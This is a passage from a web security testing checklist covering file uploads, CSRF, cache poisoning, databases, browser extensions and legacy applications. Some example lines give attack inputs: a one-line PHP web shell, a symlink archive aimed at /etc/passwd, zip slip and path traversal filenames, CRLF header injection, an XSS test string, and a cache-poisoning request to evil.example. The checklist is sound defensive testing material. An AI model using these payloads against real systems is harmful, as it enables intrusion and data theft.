  *Refs:* asvs: V5.2.3; cheatsheet: File_Upload_Cheat_Sheet, Denial_of_Service_Cheat_Sheet; cwe: CWE-409, CWE-400; capec: CAPEC-197

- [ ] **WEB-FILE-005** Test per-user file and storage quota enforcement  
  *Severity if fail:* Low | *Type:* Automated | *Level:* ASVS L3  
  *Objective:* Finds upload features missing a per-user limit on file count or total storage.  
  *Steps:*
  1. Identify the stated quota for file count and total storage size per user.
  2. Upload files repeatedly as a single user until the stated quota should be reached.
  3. Confirm whether the application rejects uploads once the quota is exceeded.
  *Example:* `Loop curl -F "file=@1mb.bin" https://target/upload past the documented per-user quota and check for rejection`  
  *Expected:* The application enforces a per-user file count and storage quota and rejects uploads once the quota is exceeded.  
  *Refs:* asvs: V5.2.4; cwe: CWE-770; capec: CAPEC-130

- [ ] **WEB-FILE-006** Test archive uploads for symlink inclusion  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds archive extraction that preserves symbolic links pointing outside the intended directory.  
  *Steps:*
  1. Create a symbolic link to a sensitive file, for example /etc/passwd.
  2. Package the symlink into an archive and upload it.
  3. Check whether the extracted symlink is preserved and whether reading the linked file discloses its content.
  *Example:* `ln -s /etc/passwd link.txt; tar -czf malicious.tar.gz link.txt; upload malicious.tar.gz and request link.txt`  
  *Expected:* The extraction process rejects or strips symbolic links unless an explicit allowlist of symlink targets is enforced.  
  *Refs:* wstg: WSTG-BUSL-09; asvs: V5.2.5; cheatsheet: File_Upload_Cheat_Sheet; cwe: CWE-61, CWE-59; capec: CAPEC-132

- [ ] **WEB-FILE-007** Test image upload for pixel flood attacks  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds image processing features missing a maximum pixel dimension check.  
  *Steps:*
  1. Identify an image upload feature that processes or resizes images server-side.
  2. Create an image file with an extreme pixel width and height but a small file size.
  3. Upload the image and monitor memory and CPU use during processing.
  *Example:* `Craft a PNG with declared dimensions of 65000x65000 pixels and a tiny compressed size, then upload it`  
  *Expected:* The application rejects images above a maximum pixel size before decoding or processing them.  
  *Refs:* asvs: V5.2.6; cwe: CWE-400; capec: CAPEC-130

- [ ] **WEB-FILE-008** Test uploaded files for malicious content and web shells  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds upload features missing malware scanning that would allow a web shell or malware to be stored and executed.  
  *Steps:*
  1. Identify an upload feature and the folder files are stored in.
  2. Upload the EICAR anti-malware test file and confirm it is detected and quarantined.
  3. If the server may execute uploaded code, upload a minimal web shell with a random filename and request it directly.
  4. Remove the web shell immediately after confirming execution.
  *Example:* `Upload the EICAR string X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* ; then upload a minimal <?php system($_GET["cmd"]); ?> shell with a random name`  
  *Expected:* Uploaded files are scanned for malware and files stored in a public folder are never executed as server-side code.  
  *Refs:* wstg: WSTG-BUSL-09; asvs: V5.3.1; cheatsheet: File_Upload_Cheat_Sheet; cwe: CWE-434; capec: CAPEC-650

- [ ] **WEB-FILE-009** Test archive extraction for zip slip path traversal  
  *Severity if fail:* Critical | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds archive extraction code that writes entries to attacker-chosen paths outside the target directory.  
  *Steps:*
  1. Identify a feature that extracts an uploaded archive, such as zip, on the server.
  2. Create an archive containing an entry with a path traversal sequence in its name.
  3. Upload the archive and check whether a file is written outside the intended extraction directory.
  *Example:* `zip test.zip base ../../../traversed to create an entry whose name escapes the target directory on extraction`  
  *Expected:* The extraction code validates each entry path against the target directory and ignores or rejects path traversal sequences.  
  *Refs:* asvs: V5.3.3; cheatsheet: File_Upload_Cheat_Sheet; cwe: CWE-22; capec: CAPEC-126, CAPEC-139

- [ ] **WEB-FILE-010** Test served filenames for validation and Content-Disposition handling  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds downloads that trust a client-submitted filename for the response or storage path.  
  *Steps:*
  1. Identify a download or export feature that accepts a filename from the client, including in JSON or a URL parameter.
  2. Submit a filename containing path traversal characters or an unexpected extension.
  3. Check that the response sets a safe Content-Disposition filename regardless of the submitted value.
  *Example:* `filename=../../etc/passwd submitted in a JSON body or URL parameter to a download endpoint`  
  *Expected:* The server ignores or strictly validates a client-submitted filename and always sets its own safe filename in Content-Disposition.  
  *Refs:* asvs: V5.4.1; cheatsheet: File_Upload_Cheat_Sheet; cwe: CWE-22, CWE-641; capec: CAPEC-126

- [ ] **WEB-FILE-011** Test served filenames for header and injection safety  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds filenames reflected in response headers or email attachments without encoding against injection.  
  *Steps:*
  1. Upload a file whose name contains CRLF sequences or special characters.
  2. Download the file and inspect the Content-Disposition header for injected header fields.
  3. If files are emailed as attachments, check the attachment filename for the same encoding.
  *Example:* `filename="normal.txt\r\nX-Injected: true" uploaded then downloaded to inspect the response header`  
  *Expected:* Served filenames are encoded or sanitized following RFC 6266 so they cannot inject headers or break document structure.  
  *Refs:* asvs: V5.4.2; cwe: CWE-93, CWE-113; capec: CAPEC-34

- [ ] **WEB-FILE-012** Test files from untrusted sources for antivirus scanning  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Finds files obtained from third parties or users that are served without malware scanning.  
  *Steps:*
  1. Identify files obtained from an untrusted source, such as a partner feed or a public upload area.
  2. Confirm whether an antivirus or content-scanning step runs before the file is made available to other users.
  3. Upload the EICAR test file through the untrusted-source path and confirm detection.
  *Example:* `Upload the EICAR string through a partner-integration or public upload path and confirm it is scanned before being served`  
  *Expected:* All files from untrusted sources are scanned by an antivirus engine before being served to other users.  
  *Refs:* asvs: V5.4.3; cheatsheet: File_Upload_Cheat_Sheet; cwe: CWE-434; capec: CAPEC-650

- [ ] **WEB-FILE-013** Test rejection of unexpected file types at upload  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds upload features that accept file types outside the documented allowlist.  
  *Steps:*
  1. Review the documentation for file types the feature should reject.
  2. Prepare files of disallowed types, including an HTML file containing a script and an executable.
  3. Upload each disallowed file type and confirm it is rejected, not merely hidden from the UI.
  *Example:* `Upload a .jsp, .exe and an HTML file containing <script>alert(1)</script> to an image-only upload feature`  
  *Expected:* The server rejects every file type outside the documented allowlist, independent of any client-side check.  
  *Refs:* wstg: WSTG-BUSL-08; cheatsheet: File_Upload_Cheat_Sheet; cwe: CWE-434; capec: CAPEC-650


## ABUSE

- [ ] **WEB-ABUSE-001** Check that abuse cases exist for each business feature  
  *Severity if fail:* Low | *Type:* Manual  
  *Objective:* Finds features that nobody reviewed for misuse, so generic security requirements stay unclear.  
  *Steps:*
  1. Ask for the list of features and the list of abuse cases.
  2. Make sure each abuse case has a unique identifier, the affected feature and an attack description.
  3. Make sure each abuse case is marked technical or business and has a business risk rating.
  4. Make sure the workshop had business, risk, pentest, technical and QA roles.
  *Example:* `Spreadsheet with FEATURES, ABUSE CASES and COUNTERMEASURES sheets; CAPEC and OWASP Testing Guide as attack lists`  
  *Expected:* Each feature has abuse cases with identifier, type and risk rating. The list comes from a documented review.  
  *Refs:* cheatsheet: Abuse_Case_Cheat_Sheet; capec: CAPEC-17

- [ ] **WEB-ABUSE-002** Check that selected abuse cases become requirements and are validated  
  *Severity if fail:* Low | *Type:* Config Review, Manual  
  *Objective:* Finds abuse cases that never reach the specification or whose countermeasures nobody tests.  
  *Steps:*
  1. Take five selected abuse cases.
  2. Make sure each appears as a security requirement or an acceptance criterion in the feature.
  3. Look in the design notes and code for a reference to the abuse case identifier.
  4. Make sure an automated test, a SAST rule or a manual check validates each countermeasure.
  5. Make sure the penetration test scope lists the abuse cases.
  *Example:* `grep -rn "ABUSE_CASE_" src/ docs/ tests/`  
  *Expected:* Each selected abuse case has a requirement, a code or design reference and a repeatable validation.  
  *Refs:* cheatsheet: Abuse_Case_Cheat_Sheet


## BOT

- [ ] **WEB-BOT-001** Test rate-limit key design for login and recovery endpoints  
  *Severity if fail:* High | *Type:* Manual, Automated | *Level:* ASVS L2  
  *Objective:* Find rate limits that an attacker passes by changing the IP address, the username form or the request timing.  
  *Steps:*
  1. Find out which keys the limit uses: IP, session, username or a mix.
  2. Send many attempts against one username from many source IP addresses.
  3. Send many usernames from one source IP address.
  4. Change the username case and add spaces or encoding to reach a new bucket.
  5. Add X-Forwarded-For and similar headers with new values.
  6. Send attempts at the end and the start of a time window.
  7. Make sure the limit answer is a generic 429 without detail.
  *Example:* `ffuf or Burp Intruder with a rotating X-Forwarded-For; one username with 50 attempts from proxies; compare 429 bodies`  
  *Expected:* Separate limits apply per username and per source. Header changes and username variants do not reset the counters. Bursts at window edges are blocked.  
  *Refs:* owasp_top10: A07:2025; cheatsheet: Bot_Management_and_Anti-Automation_Cheat_Sheet; asvs: V2.4.1; cwe: CWE-307, CWE-799; capec: CAPEC-112

- [ ] **WEB-BOT-002** Test signup, card testing and inventory flows for velocity limits  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find business flows that let bots create fake accounts, test stolen cards or hold stock.  
  *Steps:*
  1. List the flows at risk: signup, low-value purchase, cart hold and coupon check.
  2. Create many accounts with one device and one email domain.
  3. Try many small payments with different test card numbers.
  4. Add items to the cart and keep them without payment.
  5. Look for limits, verification steps and queues in each flow.
  6. Look at the logs for alerts on these patterns.
  *Example:* `Burp Turbo Intruder on POST /signup and POST /checkout in a test environment; review the fraud alerts`  
  *Expected:* Each flow has velocity limits per identity, device and payment data. Cart holds expire. The team gets alerts for the patterns.  
  *Refs:* owasp_top10: A06:2025; cheatsheet: Bot_Management_and_Anti-Automation_Cheat_Sheet; wstg: WSTG-BUSL-05; asvs: V2.4.1; cwe: CWE-799, CWE-770


## CACHE

- [ ] **WEB-CACHE-001** Test unkeyed request inputs for web cache poisoning  
  *Severity if fail:* High | *Type:* Manual, Automated  
  *Objective:* Find request inputs that change a cached response but are not part of the cache key.  
  *Steps:*
  1. Find cached pages with the response headers Age, X-Cache or CF-Cache-Status.
  2. Add a cache buster to the URL so that only you see the test entry.
  3. Send unkeyed inputs one at a time, such as X-Forwarded-Host, X-Forwarded-Scheme and a body on a GET request.
  4. Look for the value in links, redirects, JSON and response headers.
  5. Request the same URL without the extra input and look for the changed response.
  6. Remove the test entry from the cache after the test.
  *Example:* `curl -s "https://target/?cb=123" -H "X-Forwarded-Host: evil.example"; then curl -s "https://target/?cb=123" | grep evil; Burp Param Miner`  
  *Expected:* Unkeyed inputs do not change a cacheable response. Forwarded headers are trusted only from the proxy, and the cache key holds every input that changes the output.  
  *Refs:* owasp_top10: A02:2025; wstg: WSTG-CONF-13; cheatsheet: Web_Cache_Security_Cheat_Sheet; cwe: CWE-444, CWE-524; capec: CAPEC-141

- [ ] **WEB-CACHE-002** Review CDN and proxy cache rules against the origin cache policy  
  *Severity if fail:* Medium | *Type:* Config Review, Manual | *Level:* ASVS L2  
  *Objective:* Find CDN or proxy rules that override origin headers and cache sensitive, error or redirect responses.  
  *Steps:*
  1. List the cache rules of the CDN and reverse proxy.
  2. Look for rules that override Cache-Control, or that cache by file extension, path or status code.
  3. Check the cache policy of error pages, redirects and authentication responses.
  4. Make sure Vary: Cookie is not the only control for personalized pages.
  5. Make sure the URL normalization is the same at the CDN, the proxy and the origin.
  6. Test the purge function for one key or one route group.
  *Example:* `CDN configuration export; curl -sI of /login, /404, /redirect and /account with and without cookies`  
  *Expected:* Cache rules follow an allowlist of routes. No rule makes a personalized response public. Purge works for a narrow scope.  
  *Refs:* owasp_top10: A02:2025; wstg: WSTG-CONF-13; asvs: V14.2.2; cheatsheet: Web_Cache_Security_Cheat_Sheet; cwe: CWE-524; capec: CAPEC-141  
  *See:* WEB-CONF-013


## CODEREV

- [ ] **WEB-CODEREV-001** Check that the secure code review process covers baseline and diff reviews  
  *Severity if fail:* Medium | *Type:* Config Review, Manual  
  *Objective:* Finds missing or weak security review of new applications and of code changes.  
  *Steps:*
  1. Ask for the secure code review procedure.
  2. Make sure it defines baseline reviews for new applications, major releases and legacy onboarding.
  3. Make sure it defines diff-based reviews for pull requests.
  4. Make sure reviewers get the threat model, earlier findings and a list of high-risk functions before the review.
  5. Take three recent pull requests. Make sure a security-focused review is on record.
  *Example:* `Procedure document; gh pr list --state merged --limit 20 --json number,reviews`  
  *Expected:* A written procedure defines both review types and their inputs. Recent changes have a security-focused review on record.  
  *Refs:* cheatsheet: Secure_Code_Review_Cheat_Sheet, Threat_Modeling_Cheat_Sheet; cwe: CWE-1059

- [ ] **WEB-CODEREV-002** Review the code for high-risk patterns by scan and by hand  
  *Severity if fail:* High | *Type:* Code Review  
  *Objective:* Finds hard-coded secrets, unsafe functions and injectable queries that tools alone may miss.  
  *Steps:*
  1. Search the source for hard-coded secrets such as password, api_key and secret assignments.
  2. Search for unsafe functions such as eval, exec, innerHTML and document.write.
  3. Search for queries built with string concatenation.
  4. Read each hit and decide if user-controlled data can reach it.
  5. Use SAST findings to rank the areas for manual review.
  *Example:* `grep -riE "password\s*=|api_key\s*=|secret\s*=" src/; grep -rE "eval\(|exec\(|innerHTML|document\.write" src/; grep -rE "SELECT.*\+|executeQuery.*\+" src/`  
  *Expected:* No hit is exploitable. Each hit has a decision on record. Hard-coded secrets are absent.  
  *Refs:* cheatsheet: Secure_Code_Review_Cheat_Sheet; cwe: CWE-798, CWE-89, CWE-95, CWE-79

- [ ] **WEB-CODEREV-003** Trace data from sources to sinks across trust boundaries in the code  
  *Severity if fail:* High | *Type:* Code Review  
  *Objective:* Finds places where untrusted data reaches a sink without validation, encoding or authorization.  
  *Steps:*
  1. List the sources: user input, file uploads, API calls, database reads and environment variables.
  2. List the sinks: database queries, file writes, output rendering, logs and external APIs.
  3. Follow each source through validation, transformation and business logic to its sink.
  4. Make sure each trust boundary has input validation and output encoding.
  5. Make sure sensitive data has protection that fits its classification at each step.
  *Example:* `Data flow notes per feature; CodeQL or Semgrep taint rules to find source-sink paths`  
  *Expected:* Every path from an untrusted source to a sink has validation or encoding at the trust boundary. Sensitive data stays protected.  
  *Refs:* cheatsheet: Secure_Code_Review_Cheat_Sheet; cwe: CWE-20, CWE-116


## CSRF

- [ ] **WEB-CSRF-001** Test origin checks with Origin, Referer and Sec-Fetch-Site headers  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find state-changing endpoints that accept requests from another site because the server does not check the request origin.  
  *Steps:*
  1. List the state-changing requests that use cookie authentication.
  2. Replay each request with an Origin header from an attacker site.
  3. Replay each request with Origin: null and with the Origin header removed.
  4. Replay each request with Sec-Fetch-Site: cross-site and a foreign Referer header.
  5. Look for a safe method such as GET that changes state.
  6. Make sure the server does not allow the literal null origin or a partial host match.
  *Example:* `curl -b "session=<id>" -H "Origin: https://evil.example" -H "Sec-Fetch-Site: cross-site" -X POST https://target/account/email -d "email=a@b.test"; also test Origin: https://target.evil.example`  
  *Expected:* The server rejects cross-site requests that change state. It checks the Origin header, uses Referer only as a fallback, and does not trust null or a partial match.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-SESS-05; asvs: V3.5.1, V3.5.3; cheatsheet: Cross-Site_Request_Forgery_Prevention_Cheat_Sheet; cwe: CWE-352; capec: CAPEC-62; other: OWASP DevGuide web app checklist: 06-digital-identity.md

- [ ] **WEB-CSRF-002** Test that anti-CSRF tokens are bound to the session and are random  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find CSRF tokens that an attacker can predict, reuse, or use with another account.  
  *Steps:*
  1. Collect anti-CSRF tokens from several sessions and users.
  2. Look at the tokens for patterns, such as a user ID, an email address, or a time value.
  3. Use a valid token of user A in a request of user B.
  4. Use a token from before logout or login in a new session.
  5. Look for tokens in URLs, Referer headers, and logs.
  6. Send the token in a different place, such as a query parameter, and in an empty form.
  *Example:* `Burp Sequencer on the token; repeat a POST with the token of another session; compare token values with Burp Comparer`  
  *Expected:* Each token is unique per session, secret and unpredictable. The server rejects a token of another session, an old token, and an empty token. Tokens are not in URLs.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-SESS-05; asvs: V3.5.1; cheatsheet: Cross-Site_Request_Forgery_Prevention_Cheat_Sheet; cwe: CWE-352; capec: CAPEC-62; other: OWASP DevGuide web app checklist: 06-digital-identity.md

- [ ] **WEB-CSRF-003** Test double-submit cookie tokens for forgery from a subdomain  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find double-submit CSRF defenses where an attacker can set the token cookie and a matching request value.  
  *Steps:*
  1. Find out if the CSRF token is a cookie value that is copied into the request.
  2. Check if the token is signed (HMAC) and tied to the session.
  3. Set an own cookie with a chosen token value from a sibling subdomain or over HTTP, in a test environment.
  4. Send a request with the same chosen value in the cookie and in the header.
  5. Check if the cookie uses the __Host- prefix and no Domain attribute.
  *Example:* `Set-Cookie: csrf=attacker; Domain=example.com from a test subdomain, then POST with X-CSRF-Token: attacker`  
  *Expected:* The server rejects a token that it did not issue for this session. The token cookie cannot be set from another subdomain.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-SESS-05; asvs: V3.3.2; cheatsheet: Cross-Site_Request_Forgery_Prevention_Cheat_Sheet; cwe: CWE-352; capec: CAPEC-62

- [ ] **WEB-CSRF-004** Test login and other pre-session forms for cross-site request forgery  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find login forms that accept a forged request, which lets an attacker sign the victim in to an attacker account.  
  *Steps:*
  1. Open the login form without a session and look for a CSRF token.
  2. Submit the login request from a page on another origin, in a test environment.
  3. Check if the victim then works in the attacker account and saves private data there.
  4. Do the same for the sign-up and password reset forms.
  *Example:* `Host an HTML form that posts attacker credentials to https://target/login and open it in a browser that has no session`  
  *Expected:* The login and pre-session forms need a CSRF token or an origin check. A forged login request fails.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-SESS-05; asvs: V3.5.1; cheatsheet: Cross-Site_Request_Forgery_Prevention_Cheat_Sheet; cwe: CWE-352; capec: CAPEC-62

- [ ] **WEB-CSRF-005** Test client-side code for request forgery from URL and DOM inputs  
  *Severity if fail:* High | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find client-side CSRF where attacker input in the URL or the DOM makes the page send a state-changing same-origin request.  
  *Steps:*
  1. Search the JavaScript for request calls that build the URL or body from location, hash or postMessage data.
  2. Put path traversal and extra parameters in the input, such as ../ and &action=delete.
  3. Open a crafted link as the victim and watch the network requests.
  4. Check if the request carries the CSRF token and the session cookie.
  *Example:* `https://target/app#/profile/..%2f..%2fadmin%2fdelete ; use browser DevTools network tab and grep the bundle for fetch(`  
  *Expected:* Client-side code does not build request targets from untrusted input without allowlist checks. The server still checks the token and the origin of each state-changing request.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-SESS-05, WSTG-CLNT-01; cheatsheet: Cross-Site_Request_Forgery_Prevention_Cheat_Sheet; cwe: CWE-352; capec: CAPEC-62


## DB

- [ ] **WEB-DB-001** Review database server hardening and default content  
  *Severity if fail:* Medium | *Type:* Config Review  
  *Objective:* Find database servers with default accounts, sample data, risky functions or weak host settings.  
  *Steps:*
  1. List the database engines and versions and compare them with the vendor security baseline.
  2. Look for default accounts and sample databases.
  3. Look for risky features: xp_cmdshell, CLR, the FILE privilege and database links.
  4. Make sure the service runs as a low-privilege operating system user.
  5. Make sure the management tools need authentication, HTTPS and network limits.
  6. Make sure backups are encrypted and have restricted permissions.
  *Example:* `SQL Server: SELECT name,value_in_use FROM sys.configurations WHERE name IN ('xp_cmdshell','clr enabled'); MySQL: SHOW GRANTS; SELECT user,host FROM mysql.user;`  
  *Expected:* No default account or sample database remains. Risky features are off. The service has low privilege, and backups and management tools are protected.  
  *Refs:* owasp_top10: A02:2025; cheatsheet: Database_Security_Cheat_Sheet; cwe: CWE-1188, CWE-250; other: OWASP DevGuide web app checklist: 03-secure-database-access.md

- [ ] **WEB-DB-002** Review application database accounts, permissions and encrypted connections  
  *Severity if fail:* High | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Find application database accounts with too many rights, shared credentials or unencrypted connections.  
  *Steps:*
  1. List the database accounts of each application and environment.
  2. Make sure each account serves one application and each environment has its own database and account.
  3. Make sure no account is root, sa or SYS, owns the schema or has administrative rights.
  4. Compare the granted rights with the needed rights, at table, column or view level.
  5. Make sure each account connects only from the allowed hosts.
  6. Make sure the server needs TLS and the client checks the server certificate.
  7. Make sure the connection string is not in source code.
  *Example:* `psql: \du+ ; SELECT grantee,table_name,privilege_type FROM information_schema.role_table_grants WHERE grantee='<app>'; SHOW ssl;`  
  *Expected:* Each application uses its own least-privilege account. Connections use TLS with certificate checks. Credentials are outside the source code.  
  *Refs:* owasp_top10: A02:2025, A04:2025; cheatsheet: Database_Security_Cheat_Sheet; asvs: V13.2.3; cwe: CWE-250, CWE-319; other: OWASP DevGuide web app checklist: 03-secure-database-access.md


## PWD

- [ ] **WEB-PWD-023** Check that a user cannot reuse a recent password  
  *Severity if fail:* Low | *Type:* Manual  
  *Objective:* Find password change and reset flows that accept a password that the user used before.  
  *Steps:*
  1. Read the password policy for the rule on password reuse and the number of stored old passwords.
  2. Change the password to a new value, and then change it back to the old value.
  3. Use the password reset flow to set the old password again.
  4. Change the password to a variation of the old value, such as a new digit at the end.
  5. Make sure the history holds hashes and not plain text.
  *Example:* `Test account: change Passw0rd-A to Passw0rd-B, then back to Passw0rd-A, in the change form and in the reset form`  
  *Expected:* The application rejects a recent password in the change flow and in the reset flow, as the policy says. The history holds only hashes.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-ATHN-07; cwe: CWE-262; other: OWASP DevGuide web app checklist: 06-digital-identity.md


## DESER

- [ ] **WEB-DESER-001** Review isolation, logging and monitoring around code that deserializes data  
  *Severity if fail:* Medium | *Type:* Config Review, Code Review  
  *Objective:* Find deserialization features that run with high privilege and without logs, which makes abuse hard to limit and to detect.  
  *Steps:*
  1. Find the code and services that deserialize data from clients or other systems.
  2. Check the type allowlist and the integrity check that apply before the object is created.
  3. Check that the deserializing component runs with low privilege, for example in a temporary container.
  4. Check the network rules for inbound and outbound connections of that component.
  5. Send a malformed serialized object and look in the log for the failure.
  6. Look for an alert on repeated deserialization failures from one client.
  *Example:* `Search the code for readObject, pickle.loads, unserialize and BinaryFormatter; check container securityContext and egress rules; send a corrupted object`  
  *Expected:* Deserializing components run with low privilege and limited network access. Failures are logged and repeated failures raise an alert.  
  *Refs:* owasp_top10: A08:2025; cwe: CWE-502; other: OWASP DevGuide web app checklist: 05-validate-inputs.md  
  *See:* WEB-INJ-025


## ELEV

- [ ] **WEB-ELEV-001** Review code and services that run with elevated privileges  
  *Severity if fail:* Medium | *Type:* Config Review, Code Review  
  *Objective:* Find components that hold high privileges longer than needed, which makes any flaw in them more severe.  
  *Steps:*
  1. List the services and code paths that run as root, administrator or with raised capabilities.
  2. Find out why each one needs the privilege and which step uses it.
  3. Check that the code raises privilege just before that step and drops it as soon as the step ends.
  4. Check that user input is not processed while the privilege is active.
  5. Check the process owner and capabilities at run time.
  *Example:* `ps -eo user,pid,cmd | grep -v "^<app_user>"; getpcaps <pid>; Windows: Get-Process -IncludeUserName; review setuid or impersonation calls in the code`  
  *Expected:* Elevated privilege is held only for the step that needs it. The application runs as a low-privilege account for all other work.  
  *Refs:* owasp_top10: A06:2025, A02:2025; cwe: CWE-250, CWE-272; other: OWASP DevGuide web app checklist: 07-access-controls.md


## EMAIL

- [ ] **WEB-EMAIL-001** Test email address normalization for duplicate and look-alike accounts  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Find identity flows that treat one email address in different ways, which allows duplicate, merged or spoofed accounts.  
  *Steps:*
  1. Register an account with a mixed-case domain and then register again with a lowercase domain.
  2. Register with a different case in the local part and with plus tags and dots.
  3. Register with a Cyrillic or other look-alike character in the local part and in the domain.
  4. Use the variants in login, password reset and account linking and look at which account answers.
  5. Make sure the stored address keeps the original form and the comparison policy is the same in every flow.
  *Example:* `user@Example.com vs user@example.com; usеr@example.com (Cyrillic e); user+tag@example.com; xn-- punycode domain`  
  *Expected:* The application applies one documented comparison policy in all flows. Look-alike and equivalent addresses cannot take over or merge with another account.  
  *Refs:* owasp_top10: A07:2025; cheatsheet: Email_Validation_and_Verification_Cheat_Sheet; wstg: WSTG-IDNT-04; cwe: CWE-289, CWE-180; other: OWASP DevGuide web app checklist: 06-digital-identity.md

- [ ] **WEB-EMAIL-002** Test email ownership verification and the email change workflow  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Find flows that let an attacker use or take over an account with an email address that the attacker does not own.  
  *Steps:*
  1. Register and try to use the account before you open the verification link.
  2. Examine the verification tokens for randomness, single use, and expiry.
  3. Change the email address and check that the new address needs confirmation before it becomes active.
  4. Check that the old address gets a notice and that re-authentication is needed.
  5. Change the address in the request to another user address and look at the result.
  6. Look in logs for full addresses and for tokens in URLs.
  *Example:* `Burp Repeater on POST /account/email; compare token values from three registrations; open the same link twice`  
  *Expected:* The account stays inactive until the address is verified. Tokens are random, single-use and expire. A change needs re-authentication and confirmation, and the old address gets a notice.  
  *Refs:* owasp_top10: A07:2025; cheatsheet: Email_Validation_and_Verification_Cheat_Sheet; wstg: WSTG-IDNT-02; cwe: CWE-640, CWE-620; other: OWASP DevGuide web app checklist: 06-digital-identity.md


## EXT

- [ ] **WEB-EXT-001** Review browser extension permissions, manifest and update path  
  *Severity if fail:* Medium | *Type:* Config Review, Code Review  
  *Objective:* Find extensions that ask for too many permissions, run weak policies or load code that nobody reviewed.  
  *Steps:*
  1. Read manifest.json and list the permissions, host permissions and content script matches.
  2. Remove each permission that no feature needs.
  3. Look for optional permissions where full access is not always needed.
  4. Look at content_security_policy.extension_pages and make sure scripts load from the package only.
  5. Search the code for remote scripts and eval-like calls.
  6. Make sure updates come from the extension store and that the dependencies are audited.
  *Example:* `unzip ext.crx -d ext; jq .permissions,.host_permissions,.content_security_policy ext/manifest.json; npm audit`  
  *Expected:* The manifest asks only for needed permissions and a strict policy. The extension loads no remote code, and the dependencies have no known vulnerabilities.  
  *Refs:* owasp_top10: A02:2025, A03:2025; cheatsheet: Browser_Extension_Vulnerabilities_Cheat_Sheet; cwe: CWE-250, CWE-829

- [ ] **WEB-EXT-002** Test extension message handlers for sender validation  
  *Severity if fail:* High | *Type:* Manual, Code Review  
  *Objective:* Find extension code that accepts messages from web pages or other extensions and runs privileged actions.  
  *Steps:*
  1. List the runtime.onMessage and onMessageExternal handlers, and the externally_connectable settings.
  2. Send a message from a web page through the content script with a new action name.
  3. Send a message from another extension or a different frame.
  4. Check that the handler tests sender.id and sender.origin and allows only known actions and fields.
  5. Check that the handler does not use message data in innerHTML or eval.
  *Example:* `DevTools console on a test page: chrome.runtime.sendMessage("<ext-id>",{action:"getToken"}); grep -R "onMessage" ext/`  
  *Expected:* The handlers check the sender and allow only listed actions with validated fields. A web page cannot start a privileged action or run script.  
  *Refs:* owasp_top10: A01:2025, A05:2025; cheatsheet: Browser_Extension_Vulnerabilities_Cheat_Sheet; cwe: CWE-346, CWE-79

- [ ] **WEB-EXT-003** Test extension storage, data transfer and display of sensitive data  
  *Severity if fail:* Medium | *Type:* Manual, Config Review  
  *Objective:* Find extensions that keep secrets in storage, send data in clear text or show data where a web page can read it.  
  *Steps:*
  1. Look at chrome.storage and localStorage content after use and look for tokens and personal data.
  2. Search the code for hard-coded keys.
  3. Record the network traffic of the extension and make sure it uses HTTPS only.
  4. Check if the extension adds sensitive data to the DOM of web pages.
  5. Check if the extension shows data in a popup, options page or side panel instead.
  6. Check the privacy notice and the opt-out for data collection.
  *Example:* `DevTools Application tab; mitmproxy with the browser profile; grep -R "apiKey\|secret" ext/`  
  *Expected:* The extension keeps no secrets in storage or code. All traffic uses HTTPS. Sensitive data shows only in extension UI that page scripts cannot read.  
  *Refs:* owasp_top10: A04:2025, A02:2025; cheatsheet: Browser_Extension_Vulnerabilities_Cheat_Sheet; cwe: CWE-312, CWE-319, CWE-200


## LEGACY

- [ ] **WEB-LEGACY-001** Check the inventory and risk assessment of legacy applications  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds unknown or unassessed legacy applications that keep running.  
  *Steps:*
  1. Ask for the inventory of legacy applications.
  2. Make sure each entry has the version, production date, configuration, owner and end-of-life status.
  3. Make sure each entry has a risk assessment and a threat model.
  4. Make sure the assessment states the data handled, known vulnerabilities, business impact and pivot risk.
  *Example:* `Asset inventory export; compare with network scan results`  
  *Expected:* Every legacy application is in the inventory with version, owner and a current risk assessment.  
  *Refs:* cheatsheet: Legacy_Application_Management_Cheat_Sheet; cwe: CWE-1104; nist_800_53: CM-8, RA-3

- [ ] **WEB-LEGACY-002** Check access restrictions around a legacy application  
  *Severity if fail:* High | *Type:* Config Review, Manual  
  *Objective:* Finds legacy applications that anyone on the network can reach or use with high-risk features.  
  *Steps:*
  1. Find the network location of the application. Make sure it sits in a restricted subnet.
  2. Make sure IP allow-lists or a gateway limit who can connect.
  3. Scan the hosts. Make sure only needed ports are open.
  4. Make sure only authenticated users can use it, by the application or by an IdP.
  5. Make sure high-risk features are off for users who do not need them.
  *Example:* `nmap -sV -p- HOST; curl -i https://HOST/ without credentials`  
  *Expected:* Only needed ports are open and only allowed users and networks reach the application. Unused risky features are off.  
  *Refs:* cheatsheet: Legacy_Application_Management_Cheat_Sheet; cwe: CWE-284, CWE-306; nist_800_53: AC-6, SC-7

- [ ] **WEB-LEGACY-003** Check scanning, patching and compensating controls for legacy applications  
  *Severity if fail:* High | *Type:* Config Review, Manual  
  *Objective:* Finds legacy applications with known vulnerabilities and no plan to patch or contain them.  
  *Steps:*
